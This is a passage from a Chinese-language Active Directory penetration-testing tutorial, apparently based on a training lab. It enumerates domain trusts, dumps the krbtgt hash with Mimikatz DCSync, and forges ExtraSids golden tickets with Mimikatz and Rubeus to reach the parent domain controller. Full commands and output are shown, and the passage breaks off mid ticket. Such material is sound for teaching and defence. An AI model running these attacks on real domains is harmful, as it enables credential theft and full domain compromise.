class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">02</span>:<span class="hljs-number">39</span> AM<br><br>SourceName      : FREIGHTLOGISTICS.LOCAL<br>TargetName      : INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : FOREST_TRANSITIVE<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">8</span>:<span class="hljs-number">07</span>:<span class="hljs-number">08</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">02</span>:<span class="hljs-number">41</span> AM<br><br>SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL<br>TargetName      : INLANEFREIGHT.LOCAL<br>TrustType       : WINDOWS_ACTIVE_DIRECTORY<br>TrustAttributes : WITHIN_FOREST<br>TrustDirection  : Bidirectional<br>WhenCreated     : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">6</span>:<span class="hljs-number">20</span>:<span class="hljs-number">22</span> PM<br>WhenChanged     : <span class="hljs-number">2</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">55</span>:<span class="hljs-number">55</span> PM<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainUser-检查子域中的用户"><a href="#使用-Get-DomainUser-检查子域中的用户" class="headerlink" title="使用 Get-DomainUser 检查子域中的用户"></a>使用 Get-DomainUser 检查子域中的用户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Domain</span> LOGISTICS.INLANEFREIGHT.LOCAL | <span class="hljs-built_in">select</span> SamAccountName<br><br>samaccountname<br><span class="hljs-literal">--------------</span><br>htb<span class="hljs-literal">-student_adm</span><br>Administrator<br>Guest<br>lab_adm<br>krbtgt<br></code></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询域信任"><a href="#使用-netdom-查询域信任" class="headerlink" title="使用 netdom 查询域信任"></a>使用 netdom 查询域信任</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">netdom</span> <span class="hljs-title">query</span> /<span class="hljs-title">domain:inlanefreight</span>.<span class="hljs-title">local</span> <span class="hljs-title">trust</span></span><br><span class="hljs-function"><span class="hljs-title">Direction</span> <span class="hljs-title">Trusted</span>\<span class="hljs-title">Trusting</span> <span class="hljs-title">domain</span>                         <span class="hljs-title">Trust</span> <span class="hljs-title">type</span></span><br><span class="hljs-function">========= =======================                         ==========</span><br><span class="hljs-function"></span><br><span class="hljs-function">&lt;-&gt;       <span class="hljs-title">LOGISTICS.INLANEFREIGHT.LOCAL</span></span><br><span class="hljs-function"><span class="hljs-title">Direct</span></span><br><span class="hljs-function"> <span class="hljs-title">Not</span> <span class="hljs-title">found</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">&lt;-&gt;       <span class="hljs-title">FREIGHTLOGISTICS.LOCAL</span></span><br><span class="hljs-function"><span class="hljs-title">Direct</span></span><br><span class="hljs-function"> <span class="hljs-title">Not</span> <span class="hljs-title">found</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询域控制器"><a href="#使用-netdom-查询域控制器" class="headerlink" title="使用 netdom 查询域控制器"></a>使用 netdom 查询域控制器</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">netdom</span> <span class="hljs-title">query</span> /<span class="hljs-title">domain:inlanefreight</span>.<span class="hljs-title">local</span> <span class="hljs-title">dc</span></span><br><span class="hljs-function"><span class="hljs-title">List</span> <span class="hljs-title">of</span> <span class="hljs-title">domain</span> <span class="hljs-title">controllers</span> <span class="hljs-title">with</span> <span class="hljs-title">accounts</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">domain</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">DC01</span></span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-netdom-查询工作站和服务器"><a href="#使用-netdom-查询工作站和服务器" class="headerlink" title="使用 netdom 查询工作站和服务器"></a>使用 netdom 查询工作站和服务器</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">netdom</span> <span class="hljs-title">query</span> /<span class="hljs-title">domain:inlanefreight</span>.<span class="hljs-title">local</span> <span class="hljs-title">workstation</span></span><br><span class="hljs-function"><span class="hljs-title">List</span> <span class="hljs-title">of</span> <span class="hljs-title">workstations</span> <span class="hljs-title">with</span> <span class="hljs-title">accounts</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">domain</span>:</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">MS01</span></span><br><span class="hljs-function"><span class="hljs-title">ACADEMY</span>-<span class="hljs-title">EA</span>-<span class="hljs-title">MX01</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">SQL01</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function"><span class="hljs-title">ILF</span>-<span class="hljs-title">XRG</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function"><span class="hljs-title">MAINLON</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function"><span class="hljs-title">CISERVER</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function"><span class="hljs-title">INDEX</span>-<span class="hljs-title">DEV</span>-<span class="hljs-title">LON</span>      ( <span class="hljs-title">Workstation</span> <span class="hljs-title">or</span> <span class="hljs-title">Server</span> )</span><br><span class="hljs-function">...<span class="hljs-title">SNIP</span>...</span><br></code></pre></td></tr></table></figure>

<h2 id="攻击域信任-子域-父域信任"><a href="#攻击域信任-子域-父域信任" class="headerlink" title="攻击域信任 - 子域 -&gt; 父域信任"></a>攻击域信任 - 子域 -&gt; 父域信任</h2><h3 id="使用-Mimikatz-获取-KRBTGT-账户的-NT-哈希"><a href="#使用-Mimikatz-获取-KRBTGT-账户的-NT-哈希" class="headerlink" title="使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希"></a>使用 Mimikatz 获取 KRBTGT 账户的 NT 哈希</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt;  mimikatz <span class="hljs-comment"># lsadump::dcsync /user:LOGISTICS\krbtgt</span><br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;LOGISTICS\krbtgt&#x27;</span> will be the user account<br>[<span class="hljs-type">rpc</span>] Service  : ldap<br>[<span class="hljs-type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><br>Object RDN           : krbtgt<br><br>** SAM ACCOUNT **<br><br>SAM Username         : krbtgt<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br>Account expiration   :<br>Password last change : <span class="hljs-number">11</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span>:<span class="hljs-number">33</span> AM<br>Object Security ID   : S<span class="hljs-literal">-1-5-21-2806153819-209893948-922872689-502</span><br>Object Relative ID   : <span class="hljs-number">502</span><br><br>Credentials:<br>  Hash NTLM: <span class="hljs-number">9</span>d765b482771505cbe97411065964d5f<br>    ntlm- <span class="hljs-number">0</span>: <span class="hljs-number">9</span>d765b482771505cbe97411065964d5f<br>    lm  - <span class="hljs-number">0</span>: <span class="hljs-number">69</span>df324191d4a80f0ed100c10f20561e<br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainSID"><a href="#使用-Get-DomainSID" class="headerlink" title="使用 Get-DomainSID"></a>使用 Get-DomainSID</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainSID</span><br><br>S<span class="hljs-literal">-1-5-21-2806153819-209893948-922872689</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-Get-DomainGroup-获取企业管理员组的-SID"><a href="#使用-Get-DomainGroup-获取企业管理员组的-SID" class="headerlink" title="使用 Get-DomainGroup 获取企业管理员组的 SID"></a>使用 Get-DomainGroup 获取企业管理员组的 SID</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainGroup</span> <span class="hljs-literal">-Domain</span> INLANEFREIGHT.LOCAL <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;Enterprise Admins&quot;</span> | <span class="hljs-built_in">select</span> distinguishedname,objectsid<br><br>distinguishedname                                       objectsid                                    <br><span class="hljs-literal">-----------------</span>                                       <span class="hljs-literal">---------</span>                                    <br>CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-519</span><br></code></pre></td></tr></table></figure>

<h3 id="使用-Mimikatz-创建黄金票据"><a href="#使用-Mimikatz-创建黄金票据" class="headerlink" title="使用 Mimikatz 创建黄金票据"></a>使用 Mimikatz 创建黄金票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; mimikatz.exe<br><br>mimikatz <span class="hljs-comment"># kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</span><br>User      : hacker<br>Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)<br>SID       : S<span class="hljs-literal">-1-5-21-2806153819-209893948-922872689</span><br>User Id   : <span class="hljs-number">500</span><br>Groups Id : *<span class="hljs-number">513</span> <span class="hljs-number">512</span> <span class="hljs-number">520</span> <span class="hljs-number">518</span> <span class="hljs-number">519</span><br>Extra SIDs: S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-519</span> ;<br>ServiceKey: <span class="hljs-number">9</span>d765b482771505cbe97411065964d5f - rc4_hmac_nt<br>Lifetime  : <span class="hljs-number">3</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> PM ; <span class="hljs-number">3</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2032</span> <span class="hljs-number">7</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> PM ; <span class="hljs-number">3</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2032</span> <span class="hljs-number">7</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> PM<br>-&gt; Ticket : ** Pass The Ticket **<br><br> * PAC generated<br> * PAC signed<br> * EncTicketPart generated<br> * EncTicketPart encrypted<br> * KrbCred generated<br><br>Golden ticket <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;hacker @ LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> successfully submitted <span class="hljs-keyword">for</span> current session<br></code></pre></td></tr></table></figure>

<h3 id="使用-klist-确认内存中的-Kerberos-票据"><a href="#使用-klist-确认内存中的-Kerberos-票据" class="headerlink" title="使用 klist 确认内存中的 Kerberos 票据"></a>使用 klist 确认内存中的 Kerberos 票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>xf6462<br><br>Cached Tickets: (<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#0&gt;     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span><br>        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL<br>        KerbTicket Encryption <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Ticket Flags <span class="hljs-number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent<br>        <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">3</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> (local)<br>        <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">3</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2032</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> (local)<br>        Renew Time: <span class="hljs-number">3</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2032</span> <span class="hljs-number">19</span>:<span class="hljs-number">59</span>:<span class="hljs-number">50</span> (local)<br>        Session Key <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Cache Flags: <span class="hljs-number">0</span>x1 -&gt; PRIMARY<br>        Kdc Called:<br></code></pre></td></tr></table></figure>

<h3 id="列出域控制器的整个-C-盘"><a href="#列出域控制器的整个-C-盘" class="headerlink" title="列出域控制器的整个 C:盘"></a>列出域控制器的整个 C:盘</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">ls</span> \\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span><br> Volume <span class="hljs-keyword">in</span> drive \\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span> has no label.<br> Volume Serial Number is B8B3<span class="hljs-literal">-0D72</span><br><br> Directory of \\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span><br><br><span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          PerfLogs<br><span class="hljs-number">10</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">01</span>:<span class="hljs-number">50</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          Program Files<br><span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">02</span>:<span class="hljs-number">06</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          Program Files (x86)<br><span class="hljs-number">11</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span>:<span class="hljs-number">17</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          Shares<br><span class="hljs-number">10</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">31</span> AM    &lt;<span class="hljs-built_in">DIR</span>&gt;          Users<br><span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">18</span> PM    &lt;<span class="hljs-built_in">DIR</span>&gt;          Windows<br>               <span class="hljs-number">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>               <span class="hljs-number">6</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">18</span>,<span class="hljs-number">080</span>,<span class="hljs-number">178</span>,<span class="hljs-number">176</span> bytes free<br></code></pre></td></tr></table></figure>

<h2 id="ExtraSids-攻击-Rubeus"><a href="#ExtraSids-攻击-Rubeus" class="headerlink" title="ExtraSids 攻击 - Rubeus"></a>ExtraSids 攻击 - Rubeus</h2><h3 id="使用-ls-确认无访问权限后再运行-Rubeus"><a href="#使用-ls-确认无访问权限后再运行-Rubeus" class="headerlink" title="使用 ls 确认无访问权限后再运行 Rubeus"></a>使用 ls 确认无访问权限后再运行 Rubeus</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">ls</span> \\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span><br><br><span class="hljs-built_in">ls</span> : Access is denied<br>At line:<span class="hljs-number">1</span> char:<span class="hljs-number">1</span><br>+ <span class="hljs-built_in">ls</span> \\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span><br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : PermissionDenied: (\\academy<span class="hljs-literal">-ea-dc01</span>.inlanefreight.local\c<span class="hljs-variable">$</span>:String) [<span class="hljs-built_in">Get-ChildItem</span>], UnauthorizedAcces <br>   sException<br>    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand<br>	<br>&lt;SNIP&gt; <br></code></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-创建黄金票据"><a href="#使用-Rubeus-创建黄金票据" class="headerlink" title="使用 Rubeus 创建黄金票据"></a>使用 Rubeus 创建黄金票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt;  .\Rubeus.exe golden /rc4:<span class="hljs-number">9</span>d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S<span class="hljs-literal">-1-5-21-2806153819-209893948-922872689</span>  /sids:S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-519</span> /user:hacker /ptt<br><br>   ______        _                      <br>  (_____ \      | |                     <br>   _____) )_   _| |__  _____ _   _  ___ <br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span> <br><br>[*] Action: Build TGT<br><br>[*] Building PAC<br><br>[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)<br>[*] SID            : S<span class="hljs-literal">-1-5-21-2806153819-209893948-922872689</span><br>[*] UserId         : <span class="hljs-number">500</span><br>[*] Groups         : <span class="hljs-number">520</span>,<span class="hljs-number">512</span>,<span class="hljs-number">513</span>,<span class="hljs-number">519</span>,<span class="hljs-number">518</span><br>[*] ExtraSIDs      : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-519</span><br>[*] ServiceKey     : <span class="hljs-number">9</span>D765B482771505CBE97411065964D5F<br>[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5<br>[*] KDCKey         : <span class="hljs-number">9</span>D765B482771505CBE97411065964D5F<br>[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5<br>[*] Service        : krbtgt<br>[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL<br><br>[*] Generating EncTicketPart<br>[*] Signing PAC<br>[*] Encrypting EncTicketPart<br>[*] Generating Ticket<br>[*] Generated KERB<span class="hljs-literal">-CRED</span><br>[*] Forged a TGT <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;hacker@LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span><br><br>[*] AuthTime       : <span class="hljs-number">3</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> AM<br>[*] StartTime      : <span class="hljs-number">3</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> AM<br>[*] EndTime        : <span class="hljs-number">3</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2022</span> <span class="hljs-number">8</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> PM<br>[*] RenewTill      : <span class="hljs-number">4</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> AM<br><br><span class="hljs-function">[*] <span class="hljs-title">base64</span></span>(ticket.kirbi):<br>      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhHT3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++<span class="hljs-number">2</span>iX94uRrwa/SVfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfyk7+<span class="hljs-number">0</span>EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMcg78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzYacuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOzX3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/<span class="hljs-number">4</span>GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+HWlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMGBe1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo/RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/<span class="hljs-number">3</span>l5j0KxgjdZbwoFbC7p76IPC3BaY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/<span class="hljs-number">2</span>eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIHeOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+<span 